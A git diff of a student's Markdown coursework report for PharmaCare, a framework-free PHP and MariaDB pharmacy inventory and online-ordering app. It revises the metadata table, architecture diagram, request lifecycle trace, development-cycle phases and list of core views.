@@ -13,44 +13,78 @@
 | **Institution:** | **Daffodil International University (DIU)** |
 | **Assignment Title:** | Design, Development and Evaluation of a Dynamic Database-Driven Web Application |
 | **Topic Number & Title:** | **Topic 13: Pharmacy Inventory and Online Medicine Ordering System** |
-| **System Application Name:**| **PharmaCare** (Modular Pharmacy & Dispensary Management System) |
-| **Implementation Technology:**| PHP 8.1+ / 8.3 (Strict Typing, Core MVC), MariaDB / MySQL 10.11+ (InnoDB, PDO), Bootstrap 5.3.3, Vanilla JavaScript (ES6+ Fetch API) |
-| **External Frameworks:** | **Strictly None** (Zero Laravel, Symfony, React, Vue, or Composer bloat) |
-| **Architecture:** | Ultra-Compact Modular Architecture (29 Canonical Files) |
+| **System Application Name:**| **PharmaCare** (Enterprise Pharmacy Management & Online Ordering System) |
+| **Implementation Technology:**| PHP 8.1+ / 8.3 (Strict Typing, Core Modular MVC), MariaDB / MySQL 10.11+ (InnoDB, Native PDO), Bootstrap 5.3.3, Vanilla JavaScript (ES6+ Fetch API) |
+| **External Frameworks:** | **Strictly None** (Zero Laravel, Symfony, CodeIgniter, React, Vue, or Composer bloat) |
+| **Architecture:** | Ultra-Compact Modular MVC Architecture (30 Application Files, 11 Core Views) |
 | **Target Repository:** | [https://github.com/mahdi-014/PharmaCare-WEB.git](https://github.com/mahdi-014/PharmaCare-WEB.git) |
 | **Active Deployment Branch:** | `main` |
-| **Final Release Commit:** | `3db6a84` |
+| **Final Release Commit:** | `ff18f70` |
 | **Date of Submission:** | **November 30, 2026** |
-| **Student Name / ID:** | Md. Mahdi Hasan (ID: 241-16-016) |
+| **Student Name / ID:** | **Md. Mahdi Hasan (ID: 241-16-016)** |
 | **Semester / Section:** | Fall 2026 / Section A |
 
 ---
 
 ## Executive Summary
 
-**PharmaCare** is an enterprise-grade, student-authored web application developed to satisfy the coursework requirements of **CIS324: Web Engineering**. Designed around **Topic 13**, PharmaCare bridges two distinct yet deeply interconnected operational workflows of pharmaceutical retail:
-1. **In-Clinic Dispensary & Master Inventory Management:** Point of Sale (POS) counter billing, First-Expiry-First-Out (FEFO) stock allocation, pessimistic row locking (`SELECT ... FOR UPDATE`), multi-attribute stock filtering, supplier tracking, and executive analytics.
-2. **Customer-Facing Digital Storefront & Online Ordering:** Real-time catalog browsing, debounced live search, session-backed shopping cart, prescription upload, single-page checkout, authenticated prescription file streaming, and live order tracking.
+**PharmaCare** is an enterprise-grade, student-authored web application developed to satisfy the coursework requirements of **CIS324: Web Engineering**. Designed around **Topic 13**, PharmaCare seamlessly unifies two distinct yet interdependent operational workflows of modern pharmaceutical retail into a single cohesive, high-performance platform:
 
-The system is constructed with strictly **zero external frameworks or third-party package dependencies**, adhering strictly to native PHP 8.1+, PHP Data Objects (PDO) with prepared statements, normalized MariaDB relational tables, semantic HTML5, Bootstrap 5.3.3 CSS, and Vanilla JavaScript with the Fetch API.
+1. **In-Clinic Dispensary & Master Inventory Management:** Designed for dispensary pharmacists and pharmacy administrators, this operational engine provides real-time Point-of-Sale (POS) counter billing with instant client-side subtotal and tax calculation, First-Expiry-First-Out (FEFO) batch allocation, pessimistic row locking (`SELECT ... FOR UPDATE`) to prevent concurrent stock depletion anomalies, comprehensive formulation cataloging, supplier and category tracking, dedicated Role-Based Access Control (RBAC) user administration, and executive analytics.
+2. **Customer-Facing Digital Storefront & Online Ordering:** Designed for retail patients and online buyers, this portal delivers responsive medicine browsing with debounced asynchronous live search, dynamic category filtering, a session-backed shopping cart, mandatory doctor prescription document upload for regulated pharmaceuticals, single-page checkout (Cash on Delivery & Store Pickup), authenticated controller-mediated prescription document streaming, and real-time polling order tracking.
+
+The entire system is constructed with strictly **zero external frameworks or third-party package dependencies**. PharmaCare is built entirely upon native PHP 8.1+, PHP Data Objects (PDO) with parameterized prepared statements, a Third Normal Form (3NF) normalized MariaDB relational database with foreign key constraints, semantic HTML5, responsive Bootstrap 5.3.3 CSS, and Vanilla JavaScript using the modern Fetch API. The entire codebase is organized into **30 clean, maintainable canonical files**, delivering enterprise capabilities with zero dependency overhead.
 
 ---
 
 # Table of Contents
 1. [Task 1: Understanding Web Development Fundamentals in Context (CO1 — 5 Marks)](#task-1-understanding-web-development-fundamentals-in-context)
    - [Question 1: 3-Tier Architecture & Request-Response Lifecycle (3 Marks)](#question-1-3-tier-architecture--request-response-lifecycle)
+     - [1.1 The 3-Tier Web Architecture of PharmaCare](#11-the-3-tier-web-architecture-of-pharmacare)
+     - [1.2 End-to-End Request-Response Lifecycle Trace](#12-end-to-end-request-response-lifecycle-trace)
+     - [1.3 Step-by-Step Lifecycle Analysis](#13-step-by-step-lifecycle-analysis)
    - [Question 2: Web Development Life Cycle (WDLC) & Web Standards (2 Marks)](#question-2-web-development-life-cycle-wdlc--web-standards)
+     - [2.1 Application of the Web Development Life Cycle (WDLC) in PharmaCare](#21-application-of-the-web-development-life-cycle-wdlc-in-pharmacare)
+     - [2.2 Web Standards & Accessibility (WCAG 2.1 Level AA) Compliance](#22-web-standards--accessibility-wcag-21-level-aa-compliance)
 2. [Task 2: Applying Front-End and Back-End Development with PHP and MySQL (CO1 & CO2 — 10 Marks)](#task-2-applying-front-end-and-back-end-development-with-php-and-mysql)
    - [Question 3: Functional Core Views, PHP Language Constructs & Session State (5 Marks — CO1)](#question-3-functional-core-views-php-language-constructs--session-state)
+     - [3.1 The 11 Consolidated Core Functional Views](#31-the-11-consolidated-core-functional-views)
+     - [3.2 Detailed Functional Specification of All 11 Views](#32-detailed-functional-specification-of-all-11-views)
+     - [3.3 Comprehensive Inventory of PHP Language Constructs & Superglobals](#33-comprehensive-inventory-of-php-language-constructs--superglobals)
+     - [3.4 State & Session Management Architecture](#34-state--session-management-architecture)
    - [Question 4: Relational Database Design, 3NF Normalization & Secure PDO CRUD (5 Marks — CO2)](#question-4-relational-database-design-3nf-normalization--secure-pdo-crud)
-3. [Task 3: Analyzing Input Validation, Security, and API Integration (CO2 & CO3 — 10 Marks)](#task-3-analyzing-input-validation-security-and-api-integration)
+     - [4.1 Relational Database Normalization Analysis (1NF, 2NF, 3NF)](#41-relational-database-normalization-analysis-1nf-2nf-3nf)
+     - [4.2 Comprehensive Data Dictionary (All 10 Tables)](#42-comprehensive-data-dictionary-all-10-tables)
+     - [4.3 Entity-Relationship Diagram (ERD)](#43-entity-relationship-diagram-erd)
+     - [4.4 Secure PDO CRUD Implementation with Parameterized Statements](#44-secure-pdo-crud-implementation-with-parameterized-statements)
+     - [4.5 Pessimistic Concurrency Locking & Atomic Stock Control Engine](#45-pessimistic-concurrency-locking--atomic-stock-control-engine)
+3. [Task 3: Analyzing Input Validation, Security, and Front-End/Back-End Integration (CO2 & CO3 — 10 Marks)](#task-3-analyzing-input-validation-security-and-front-endback-end-integration)
    - [Question 5: Server-Side Input Validation & Security Threat Mitigations (5 Marks — CO2)](#question-5-server-side-input-validation--security-threat-mitigations)
+     - [5.1 Server-Side Input Sanitization & Defensive Type Casting](#51-server-side-input-sanitization--defensive-type-casting)
+     - [5.2 Contextual Output Encoding & Escaping](#52-contextual-output-encoding--escaping)
+     - [5.3 Deep Technical Analysis of Five Realistic Web Threats & PharmaCare Defenses](#53-deep-technical-analysis-of-five-realistic-web-threats--pharmacare-defenses)
    - [Question 6: Asynchronous Web API Router & Comparative Technical Analysis (5 Marks — CO3)](#question-6-asynchronous-web-api-router--comparative-technical-analysis)
+     - [6.1 The Central Web API Router (`api/router.php`)](#61-the-central-web-api-router-apirouterphp)
+     - [6.2 Complete RESTful API Endpoints Specification](#62-complete-restful-api-endpoints-specification)
+     - [6.3 Client-Side Vanilla JavaScript Fetch Consumption (`assets/script.js`)](#63-client-side-vanilla-javascript-fetch-consumption-assetsscriptjs)
+     - [6.4 Comparative Critical Analysis: Asynchronous Fetch vs. Traditional Page Reloads](#64-comparative-critical-analysis-asynchronous-fetch-vs-traditional-page-reloads)
 4. [Task 4: Evaluating Security, Architecture, and Design Decisions (CO2 & CO3 — 10 Marks)](#task-4-evaluating-security-architecture-and-design-decisions)
    - [Question 7: Session Hardening, RBAC Matrix & Security Trade-Offs (5 Marks — CO2)](#question-7-session-hardening-rbac-matrix--security-trade-offs)
+     - [7.1 Role-Based Access Control (RBAC) Permission Matrix](#71-role-based-access-control-rbac-permission-matrix)
+     - [7.2 Comprehensive Session Hardening Suite](#72-comprehensive-session-hardening-suite)
+     - [7.3 Authenticated Controller-Mediated Prescription Streaming (IDOR Elimination)](#73-authenticated-controller-mediated-prescription-streaming-idor-elimination)
+     - [7.4 Security vs. Usability Trade-Off Analysis: The 30-Minute Inactivity Timeout](#74-security-vs-usability-trade-off-analysis-the-30-minute-inactivity-timeout)
    - [Question 8: Model-View-Controller (MVC) Architectural Evaluation (3 Marks — CO3)](#question-8-model-view-controller-mvc-architectural-evaluation)
+     - [8.1 Project Component & File System Mapping](#81-project-component--file-system-mapping)
+     - [8.2 Comprehensive Function & Method Inventory (Controller, Service, Model)](#82-comprehensive-function--method-inventory-controller-service-model)
+     - [8.3 Critical Evaluation: Compact Layered MVC vs. Procedural "Spaghetti" PHP](#83-critical-evaluation-compact-layered-mvc-vs-procedural-spaghetti-php)
    - [Question 9: Concluding Evaluation, Limitations & Future Roadmaps (2 Marks — CO3)](#question-9-concluding-evaluation-limitations--future-roadmaps)
+     - [9.1 Overall System Evaluation & Architectural Strengths](#91-overall-system-evaluation--architectural-strengths)
+     - [9.2 Main Architectural & Technical Limitations](#92-main-architectural--technical-limitations)
+     - [9.3 Future Development Roadmap](#93-future-development-roadmap)
 5. [Annex A: Mandatory AI Use Disclosure Statement (University AMBER Tier Policy)](#annex-a-mandatory-ai-use-disclosure-statement)
+   - [1. AI Tool Usage Declaration Table](#1-ai-tool-usage-declaration-table)
+   - [2. Statement of Academic Integrity & Intellectual Ownership](#2-statement-of-academic-integrity--intellectual-ownership)
 
 ---
 
@@ -63,56 +97,59 @@ The system is constructed with strictly **zero external frameworks or third-part
 *(Mark Allocation: 3 Marks — CO1)*
 
 #### 1.1 The 3-Tier Web Architecture of PharmaCare
-PharmaCare is engineered upon the classic **3-Tier Client-Server Architecture**, which enforces a strict, logical separation between the presentation, business logic, and data storage layers. This architectural decoupling guarantees system maintainability, high modularity, robust security, and horizontal scalability.
+PharmaCare is engineered upon the industry-standard **3-Tier Client-Server Architecture**, which enforces strict physical and logical decoupling between the user interface presentation, the business logic execution, and the relational persistence storage. This separation guarantees high modularity, independent scalability, defensive security boundaries, and ease of software maintenance.
 
 ```
 +========================================================================================+
 |                                3-TIER SYSTEM ARCHITECTURE                              |
 +========================================================================================+
 
-    TIER 1: PRESENTATION TIER (Client Side / Browser)
+    TIER 1: PRESENTATION TIER (Client Browser Engine)
     +----------------------------------------------------------------------------------+
-    |  - Semantic HTML5 Layout & Forms (index.php, pages/*.php)                        |
-    |  - Bootstrap 5.3.3 Grid & Responsive CSS (assets/style.css)                      |
-    |  - Asynchronous Vanilla JavaScript ES6+ Fetch Engine (assets/script.js)           |
+    |  - Semantic HTML5 Layouts & Accessible Forms (index.php, pages/*.php)             |
+    |  - Responsive CSS3 Grid & Mobile Styling (Bootstrap 5.3.3 + assets/style.css)    |
+    |  - Client-Side Asynchronous Interactivity (assets/script.js via Vanilla JS Fetch)|
     +----------------------------------------------------------------------------------+
                                         ▲                │
                          HTTP/1.1 JSON  │                │  HTTP/1.1 GET / POST
-                         HTML Responses │                │  Payloads & Cookies
+                         HTML Responses │                │  Payloads & Session Cookies
                                         │                ▼
-    TIER 2: APPLICATION & LOGIC TIER (Web Server & PHP Engine)
+    TIER 2: APPLICATION & BUSINESS LOGIC TIER (Apache 2.4+ & PHP 8.1+ Engine)
     +----------------------------------------------------------------------------------+
-    |  Apache Web Server 2.4+ (VirtualHost, Rewrite Rules, Root .htaccess Protection)  |
+    |  Apache HTTP Server (VirtualHost, Directives, Root .htaccess Protection)         |
     |  ------------------------------------------------------------------------------  |
-    |  Front Controller & Route Dispatcher (index.php, actions.php, api/router.php)    |
-    |  Central Security Bootstrap & Session Lifecycle Engine (includes/functions.php)  |
-    |  Role-Based Access Control Guards & IDOR Verifier (includes/auth.php)            |
-    |  Consolidated Application Controller & State Engine (app/Controller.php)         |
-    |  Concurrency-Safe Pessimistic Stock Deduction & FEFO (app/InventoryService.php)  |
+    |  - Front Controller & Route Dispatcher: index.php                                |
+    |  - Centralized State Mutation & CSRF Guard: actions.php                          |
+    |  - Asynchronous JSON RESTful API Router: api/router.php                          |
+    |  - Security Engine, Session Lifecycle & Global Helpers: includes/functions.php   |
+    |  - Role-Based Access Control (RBAC) & IDOR Verifier: includes/auth.php           |
+    |  - Consolidated MVC Application Controller: app/Controller.php                   |
+    |  - Pessimistic Concurrency Locking & FEFO Inventory: app/InventoryService.php    |
     +----------------------------------------------------------------------------------+
                                         ▲                │
-                         PDO Result Sets│                │  SQL Queries & Transactions
-                         Associative Arr│                │  Pessimistic Row Locks
+                         PDO Result Sets│                │  Parameterized SQL Queries
+                         Associative Arr│                │  Pessimistic Row Locks (FOR UPDATE)
                                         │                ▼
-    TIER 3: DATA TIER (Relational Database Server)
+    TIER 3: DATA PERSISTENCE TIER (Relational Database Management System)
     +----------------------------------------------------------------------------------+
     |  MariaDB / MySQL 10.11+ Database Engine (`pharmacare`)                           |
-    |  - 10 Normalized 3NF InnoDB Tables with Foreign Key Constraints                  |
-    |  - ACID Compliant Transactions & Pessimistic Locks (SELECT ... FOR UPDATE)       |
-    |  - Indexed B-Trees for Fast Query Retrieval & Inventory Auditing                 |
+    |  - 10 Normalized 3NF Tables with Strict InnoDB Engine                            |
+    |  - Foreign Key Constraints (ON DELETE RESTRICT / CASCADE)                        |
+    |  - ACID Transaction Engine & Pessimistic Row Locking                             |
+    |  - Optimized Secondary B-Tree Indexes on High-Frequency Search Columns           |
     +----------------------------------------------------------------------------------+
 ```
 
 1. **Presentation Tier (Client Layer):**  
-   Runs entirely inside the client’s web browser (e.g., Google Chrome, Mozilla Firefox, Microsoft Edge). It consists of semantic HTML5 documents, visual presentation styling governed by Bootstrap 5.3.3 and custom rules in `assets/style.css`, and client-side dynamic interactivity powered by `assets/script.js`. It communicates with Tier 2 strictly over the stateless HTTP/HTTPS protocol using synchronous form dispatches (`application/x-www-form-urlencoded` or `multipart/form-data`) and asynchronous JSON exchanges (`application/json`).
+   The presentation tier executes entirely within the client's web browser environment (e.g., Google Chrome, Mozilla Firefox, Safari, Microsoft Edge). It consists of semantic HTML5 documents, responsive presentation styling powered by Bootstrap 5.3.3 and custom component declarations in `assets/style.css`, and dynamic client-side scripting in `assets/script.js`. It communicates with Tier 2 strictly over the stateless HTTP/1.1 (or HTTPS/TLS) protocol using synchronous form dispatches (`application/x-www-form-urlencoded` or `multipart/form-data`) and asynchronous JSON exchanges (`application/json`).
 2. **Application & Business Logic Tier (Server Layer):**  
-   Comprises the Apache HTTP Web Server and the PHP 8.1+ Zend Engine. It manages request routing, input validation, role-based access control (RBAC), cryptographic operations (CSRF tokens, Bcrypt password hashing), and domain state transitions. Requests are routed through central entry points:
-   - `index.php`: Front Controller for standard HTML page views.
-   - `actions.php`: Centralized mutation processor for POST form submissions.
-   - `api/router.php`: Single-point router for asynchronous JSON API endpoints.
-   The core domain logic is encapsulated inside `app/Controller.php` and `app/InventoryService.php`.
+   The application tier comprises the Apache HTTP Web Server (v2.4+) and the PHP 8.1+ Zend Engine. It manages request routing, input validation, role-based access control (RBAC), cryptographic operations (CSRF tokens, Bcrypt password hashing), and domain state transitions. Requests are routed through central entry points:
+   - `index.php`: The primary Front Controller responsible for dispatching full HTML page views.
+   - `actions.php`: The centralized form action processor for state-mutating HTTP POST submissions with mandatory CSRF token verification.
+   - `api/router.php`: The dedicated RESTful API entry point for asynchronous JSON exchanges.
+   The core domain logic is encapsulated inside `app/Controller.php` (business orchestration and financial reporting) and `app/InventoryService.php` (concurrency-safe stock management).
 3. **Data Tier (Persistence Layer):**  
-   Consists of the MariaDB / MySQL 10.11+ relational database management system running the `pharmacare` database. It enforces ACID (Atomicity, Consistency, Isolation, Durability) guarantees across multi-table operations through the InnoDB storage engine. Data communication between Tier 2 and Tier 3 is handled exclusively via PHP Data Objects (`PDO`) over persistent TCP/IP socket connections.
+   The persistence tier consists of the MariaDB / MySQL 10.11+ relational database management system hosting the `pharmacare` database. It guarantees ACID (Atomicity, Consistency, Isolation, Durability) compliance across multi-table operations through the InnoDB storage engine. Communication between Tier 2 and Tier 3 is handled exclusively via PHP Data Objects (`PDO`) over persistent TCP/IP socket connections with disabled statement emulation.
 
 ---
 
@@ -123,12 +160,12 @@ To illustrate the mechanics of the client-server interaction, we trace the compl
 sequenceDiagram
     autonumber
     actor User as Client Browser
-    participant DNS as DNS & Network
+    participant DNS as DNS & Network Gateway
     participant Apache as Apache Web Server (.htaccess)
     participant PHP as PHP Front Controller (index.php)
-    participant Func as Bootstrap (includes/functions.php)
+    participant Func as Bootstrap Engine (includes/functions.php)
     participant Ctrl as MVC Controller (app/Controller.php)
-    participant DB as MariaDB Database (PDO)
+    participant DB as MariaDB Persistence (PDO)
 
     User->>DNS: Resolve localhost / domain IP address
     DNS-->>User: Return IP (127.0.0.1)
@@ -138,7 +175,7 @@ sequenceDiagram
     PHP->>Func: require_once 'includes/functions.php'
     Note over Func: Start secure session (httponly, Lax)<br/>Verify 30-min idle timeout<br/>Initialize PDO database connection
     PHP->>Ctrl: (new Controller())->catalog()
-    Ctrl->>DB: SELECT * FROM categories ORDER BY name
+    Ctrl->>DB: SELECT * FROM categories ORDER BY name ASC
     DB-->>Ctrl: Return category rows
     Ctrl->>DB: SELECT m.* FROM medicines m WHERE active=1 AND expiry_date >= CURDATE()
     DB-->>Ctrl: Return available medicine batches
@@ -149,25 +186,36 @@ sequenceDiagram
     Note over User: DOM parsed, CSS rendered,<br/>assets/script.js initialized for debounced search
 ```
 
-##### Step-by-Step Lifecycle Description:
-1. **DNS Resolution & TCP Handshake:** The browser parses the target Uniform Resource Identifier (URI). If hosted on a live domain, it queries the local DNS cache and recursive resolvers to obtain the server's IP address. A three-way TCP handshake (SYN, SYN-ACK, ACK) establishes the network connection over port 80 (HTTP) or port 443 (HTTPS/TLS).
-2. **HTTP Request Generation:** The browser formats and transmits an HTTP/1.1 request header packet containing the request method (`GET`), URI (`/index.php?page=catalog`), accepted MIME encodings (`Accept: text/html`), user-agent string, and existing session identifiers via the `Cookie: PHPSESSID=...` header.
-3. **Web Server Interception (`.htaccess`):** The Apache web server intercepts the incoming request. It evaluates the project root [`.htaccess`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/.htaccess) file:
+---
+
+#### 1.3 Step-by-Step Lifecycle Analysis
+
+1. **DNS Resolution & Network Handshake:**  
+   The user enters `http://localhost/PharmaCare-PHP/index.php?page=catalog` into their browser address bar. The browser's network stack parses the URL, identifies the protocol (`http`), host (`localhost`), and port (`80`), and resolves the local loopback address `127.0.0.1`. A standard three-way TCP handshake (`SYN`, `SYN-ACK`, `ACK`) establishes the reliable transport connection.
+2. **HTTP Request Generation & Transmission:**  
+   The browser constructs and transmits an RFC 7230-compliant HTTP/1.1 request packet. The packet contains the request line (`GET /PharmaCare-PHP/index.php?page=catalog HTTP/1.1`), standard request headers (`Host`, `User-Agent`, `Accept: text/html`, `Accept-Language`), and existing session cookies via the `Cookie: PHPSESSID=...` header.
+3. **Web Server Interception (`.htaccess`):**  
+   The Apache web server intercepts the incoming connection. Before invoking any PHP script, Apache evaluates the project root [`.htaccess`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/.htaccess) file:
    - Enforces `Options -Indexes` to prevent directory tree enumeration.
    - Evaluates rewrite rules to verify that the client is not attempting direct access to protected directories (`config/`, `database/`, `storage/prescriptions/`).
    - Injects global security headers: `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, and `X-XSS-Protection: 1; mode=block`.
-4. **PHP Execution & Bootstrap:** Apache delegates the execution to the PHP Zend Engine. Execution enters [`index.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/index.php) (the Front Controller). The script immediately invokes [`includes/functions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/functions.php):
+4. **PHP Execution & Bootstrap Initialization:**  
+   Apache delegates execution to the PHP Zend Engine, loading [`index.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/index.php). The Front Controller immediately bootstraps the system by requiring [`includes/functions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/functions.php):
    - Sets strict session cookie parameters (`session.use_strict_mode = 1`, `cookie_httponly = 1`, `cookie_samesite = 'Lax'`).
-   - Invokes `session_start()`.
+   - Initializes `session_start()`.
    - Evaluates the 30-minute idle inactivity timeout against `$_SESSION['last_activity']`.
    - Initializes the database connection singleton via `config/database.php`.
    - Auto-loads domain classes (`App\Model`, `App\Controller`, `App\InventoryService`).
-5. **Route Parsing & Authorization:** `index.php` extracts the `page` query parameter. It checks the page whitelist. Because `catalog` is a public route, guest users and authenticated customers are granted immediate clearance without triggering a 403 or 401 redirect.
-6. **Controller Dispatch & Database Execution:** `index.php` delegates execution to `(new \App\Controllers\Controller())->catalog()`. The controller queries the database via the `Medicine` model:
+5. **Route Parsing & Authorization:**  
+   `index.php` extracts the `page` query parameter. It checks the page whitelist. Because `catalog` is a public route, guest users and authenticated customers are granted immediate clearance without triggering a 403 or 401 redirect.
+6. **Controller Dispatch & Database Execution:**  
+   `index.php` delegates execution to `(new \App\Controllers\Controller())->catalog()`. The controller queries the database via the `Medicine` model:
    - Queries `categories` to generate dynamic category filter tabs.
    - Queries `medicines` joined with `suppliers` using PDO prepared statements to fetch all unexpired, active medicines currently in stock.
-7. **View Template Rendering & Layout Assembly:** The controller loads [`pages/catalog.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/catalog.php), which is wrapped between [`includes/header.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/header.php) and [`includes/footer.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/footer.php). The data arrays are safely iterated using `foreach`, sanitizing all outputs with `e()` (`htmlspecialchars`).
-8. **HTTP Transmission & Client-Side DOM Construction:** The server flushes the output buffer, transmitting an `HTTP/1.1 200 OK` response with `Content-Type: text/html; charset=UTF-8`. The browser parses the HTML tokens into the Document Object Model (DOM), loads the compiled stylesheets (`assets/style.css`), and executes `assets/script.js`. The JavaScript runtime attaches event listeners for asynchronous debounced live search and shopping cart updates without triggering subsequent full-page reloads.
+7. **View Template Rendering & Layout Assembly:**  
+   The controller loads [`pages/catalog.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/catalog.php), which is wrapped between [`includes/header.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/header.php) and [`includes/footer.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/footer.php). The data arrays are safely iterated using `foreach`, sanitizing all outputs with `e()` (`htmlspecialchars`).
+8. **HTTP Transmission & Client-Side DOM Construction:**  
+   The server flushes the output buffer, transmitting an `HTTP/1.1 200 OK` response with `Content-Type: text/html; charset=UTF-8`. The browser parses the HTML tokens into the Document Object Model (DOM), loads the compiled stylesheets (`assets/style.css`), and executes `assets/script.js`. The JavaScript runtime attaches event listeners for asynchronous debounced live search and shopping cart updates without triggering subsequent full-page reloads.
 
 ---
 
@@ -175,7 +223,7 @@ sequenceDiagram
 *(Mark Allocation: 2 Marks — CO1)*
 
 #### 2.1 Application of the Web Development Life Cycle (WDLC) in PharmaCare
-The engineering of PharmaCare was executed methodically across all five standard phases of the Web Development Life Cycle:
+The engineering of PharmaCare was executed methodically across all five standard phases of the Web Development Life Cycle (WDLC):
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
@@ -193,7 +241,7 @@ The engineering of PharmaCare was executed methodically across all five standard
 │                 │ • Semantic HTML5 and responsive Bootstrap 5.3.3 UI        │
 │                 │ • Asynchronous JSON Web API router (api/router.php)       │
 ├─────────────────┼───────────────────────────────────────────────────────────┤
-│ 4. Testing & QA │ • Syntax validation (php -l across all 21 PHP files)      │
+│ 4. Testing & QA │ • Syntax validation (php -l across all codebase files)    │
 │                 │ • Boundary value testing (expiry dates, zero quantities)  │
 │                 │ • Concurrency & atomic transaction rollback simulation    │
 ├─────────────────┼───────────────────────────────────────────────────────────┤
@@ -204,12 +252,12 @@ The engineering of PharmaCare was executed methodically across all five standard
 ```
 
 1. **Planning & Requirements Analysis:**  
-   The project commenced with an in-depth requirements study of real-world community pharmacies in Bangladesh (e.g., Lazz Pharna, Tamanna Pharmacy). Key functional constraints identified included:
+   The project commenced with an in-depth requirements study of real-world community pharmacies in Bangladesh (e.g., Lazz Pharma, Tamanna Pharmacy). Key functional constraints identified included:
    - Mandatory segregation between Over-the-Counter (OTC) drugs and Prescription-Only Medicines (POM).
    - Strict batch-level tracking with First-Expiry-First-Out (FEFO) dispensing order.
    - The critical business risk of stock overselling caused by concurrent POS sales and online checkouts.
 2. **System & Architectural Design:**  
-   The data model was designed and normalized into Third Normal Form (3NF), comprising 10 relational tables. Foreign key relationships and integrity cascades were mathematically verified. System layouts were planned with a mobile-first philosophy, establishing high-contrast UI themes and a unified 10-view core page structure.
+   The data model was designed and normalized into Third Normal Form (3NF), comprising 10 relational tables. Foreign key relationships and integrity cascades were mathematically verified. System layouts were planned with a mobile-first philosophy, establishing high-contrast UI themes and a unified 11-view core page structure.
 3. **Implementation & Development:**  
    The application was coded using vanilla PHP 8.1+ with strict type declarations (`declare(strict_types=1)`). All database communication was built using PDO with disabled statement emulation. Asynchronous capabilities were created using Vanilla JS Fetch without jQuery or bulky libraries.
 4. **Testing, Verification & Quality Assurance:**  
@@ -222,7 +270,7 @@ The engineering of PharmaCare was executed methodically across all five standard
 
 ---
 
-#### 2.2 Web Standards & Accessibility (WCAG 2.1) Considerations
+#### 2.2 Web Standards & Accessibility (WCAG 2.1 Level AA) Compliance
 PharmaCare integrates the World Wide Web Consortium (W3C) standards and Web Content Accessibility Guidelines (WCAG 2.1 Level AA):
 
 1. **Semantic HTML5 Architecture:**  
@@ -246,14 +294,14 @@ PharmaCare integrates the World Wide Web Consortium (W3C) standards and Web Cont
 ### Question 3: Functional Core Views, PHP Language Constructs & Session State
 *(Mark Allocation: 5 Marks — CO1)*
 
-#### 3.1 The 10 Consolidated Core Functional Views
-The PharmaCare presentation layer is organized into **10 consolidated core views** located inside the `pages/` directory:
+#### 3.1 The 11 Consolidated Core Functional Views
+The PharmaCare presentation layer is organized into **11 consolidated core views** located inside the `pages/` directory:
 
 | View File | Functional Operational Scope | Primary Role Access |
 | :--- | :--- | :--- |
-| [`pages/login.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/login.php) | User authentication, session regeneration, login rate-limiting lockout alerts, and role dispatching. | Public (Guests) |
+| [`pages/login.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/login.php) | User authentication, session regeneration, lockout alerts, and role dispatching. | Public (Guests) |
 | [`pages/register.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/register.php) | Customer self-registration with client & server-side regex validation for mobile, email, and Bcrypt passwords. | Public (Guests) |
-| [`pages/dashboard.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/dashboard.php) | Executive overview: Real-time financial metrics, sales channel breakdown, inventory stock alerts, and staff account CRUD. | Admin & Staff |
+| [`pages/dashboard.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/dashboard.php) | Executive overview: Real-time financial metrics, sales channel breakdown, inventory stock alerts, and quick POS/Order links. | Admin & Staff |
 | [`pages/catalog.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/catalog.php) | Medicine storefront: Dynamic category filter pills, stock availability badges, and debounced live search grid. | All (Guests, Customer, Staff, Admin) |
 | [`pages/cart.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/cart.php) | Shopping cart management, quantity controls, delivery address checkout form, and doctor's prescription file upload. | Customer Only |
 | [`pages/orders.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/orders.php) | Dual-role queue: Staff sees master dispensary fulfillment queue; Customers see their personal chronological order history. | Customer, Staff, Admin |
@@ -261,39 +309,138 @@ The PharmaCare presentation layer is organized into **10 consolidated core views
 | [`pages/medicines.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/medicines.php) | Master inventory module: Batch catalog with multi-factor filters, add/edit formulation modal, and category/supplier CRUD tabs. | Staff & Admin (Admin for Edits) |
 | [`pages/sales.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/sales.php) | Dual-tab Point-of-Sale module: Interactive POS counter billing with dynamic line calculation + historical sales ledger. | Staff & Admin |
 | [`pages/invoice.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/invoice.php) | Clean, itemized, printable sales tax invoice for completed walk-in retail transactions and delivered online orders. | All Authenticated Users |
+| [`pages/users.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/users.php) | Dedicated Staff & System User Management: User directory table, Personnel KPIs, Add User modal, activation toggle, and password reset. | Administrator Only |
 
 ---
 
-```
-[Insert Screenshot 1: Storefront Medicine Catalog with Real-Time Category Filtering]
-Caption: Figure 3.1 — Customer Storefront Catalog (pages/catalog.php) showing real-time category filtering and stock status tokens.
-```
+#### 3.2 Detailed Functional Specification of All 11 Views
 
-```
-[Insert Screenshot 2: Integrated Shopping Cart & Checkout Interface with Prescription Upload]
-Caption: Figure 3.2 — Integrated Shopping Cart and Checkout Form (pages/cart.php) demonstrating single-page order placement.
-```
